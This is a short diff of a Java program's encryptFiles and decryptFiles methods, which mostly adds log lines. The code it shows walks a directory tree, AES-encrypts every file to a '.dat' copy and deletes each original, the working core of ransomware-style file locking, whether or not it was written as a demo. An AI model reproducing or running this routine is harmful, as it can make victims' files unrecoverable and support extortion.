@@ -79,28 +79,26 @@ public class Main {
 	}
 	
 	public void encryptFiles(String dirPath, SecretKey key, SecretKey iv, AES aes) {
-		//File[] listOfFiles = getFilesInDirectory(dirPath);
 		DirectoriesCrawler crawler = new DirectoriesCrawler(dirPath);
 		crawler.scanDirectories();
 		File[] listOfFiles = crawler.getAllFiles();
 		
 		for (int i = 0; i < listOfFiles.length; i++) {
 			File inputFile = listOfFiles[i];
-			
-			System.out.println(inputFile);
+			System.out.println("Encrypting: "+inputFile);
 			aes.encrypt(key, iv, inputFile, new File(inputFile.getPath()+".dat"));
 			inputFile.delete();
 		}
 	}
 	
 	public void decryptFiles(String dirPath, SecretKey key, SecretKey iv, AES aes) {
-		//File[] listOfFiles = getFilesInDirectory(dirPath);
 		DirectoriesCrawler crawler = new DirectoriesCrawler(dirPath);
 		crawler.scanDirectories();
 		File[] listOfFiles = crawler.getAllFiles();
 		
 		for (int i = 0; i < listOfFiles.length; i++) {
 			File inputFile = listOfFiles[i];
+			System.out.println("Decrypting: "+inputFile);
 			aes.decrypt(key, iv, inputFile, new File(inputFile.getPath().replace(".dat", "")));
 			if (aes.badDecryptionKey == true) 
 				return;
